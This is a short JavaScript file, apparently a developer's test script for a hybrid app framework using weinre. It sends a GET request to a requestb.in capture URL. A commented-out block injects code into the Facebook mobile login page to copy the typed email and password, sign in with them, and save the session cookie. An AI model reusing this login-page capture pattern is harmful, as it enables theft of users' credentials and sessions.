$devs().init(function () {
	var runs = (function () {
		$sign(window['reqs']);

		window['reqs']({
			path: 'http://requestb.in/16azrgk1',
			type: 'GET',
			// body: 'a=b',
			head: {
				'Content-Type': 'application/x-www-form-urlencoded',
				'Cookie': 'iPhone=1;'
			}
		}, function (resp) {
			console.log(resp);
		}, function (fail) {
			console.log(fail);
		});

		// $brow('https://m.facebook.com/login/').gets(['face_mail', 'face_pass']).pure(true).page({
		// 	'.*://m.facebook.com/login/': function () {
		// 		var $sign = document.getElementsByName('login')[0],
		// 			$mail = document.getElementsByName('email')[0],
		// 			$pass = document.getElementsByName('pass')[0];
		//
		// 		$sign.dataset.autoid = '';
		//
		// 		$sign.onclick = function () {
		// 			window.$send['face_mail'] = $mail.value;
		// 			window.$send['face_pass'] = $pass.value;
		// 		};
		// 	}
		// }).done(function (data) {
		// 	$face.sign({
		// 		mail: data.face_mail,
		// 		pass: data.face_pass,
		// 		doer: navigator.userAgent
		// 	}).fail(function (data) {
		// 		$sign('FAIL ::', data);
		// 	}).done(function (sess) {
		// 		$regx('c_user=(.*?);').uniq(true).pure(true).data(sess).done(function (data) {
		// 			$use(data).move(1).done(function (data) {
		// 				$save('face_iden').sets(data);
		//
		// 				$save('face_sess').sets(sess);
		//
		// 				$save('*').gets().done(function (data) {
		// 					document.getElementById('main').innerHTML = data['face_iden'];
		//
		// 					$sign('DONE ::', data);
		// 				});
		// 			});
		// 		});
		// 	});
		// });
	});

	$time(100).cont(true).done(function () {
		var cont = true,
			mods = window['modjewel']['getLoadedModuleIds'](),
			same = 'weinre/target/ElementHighlighterDivs2',
			curr = mods[mods.length - 1];

		$use(curr).same(same).done(function () {
			cont = false;

			$sign(':: PREP ::');

			runs();
		});

		return cont;
	});

	// $bars('stat').drop();
});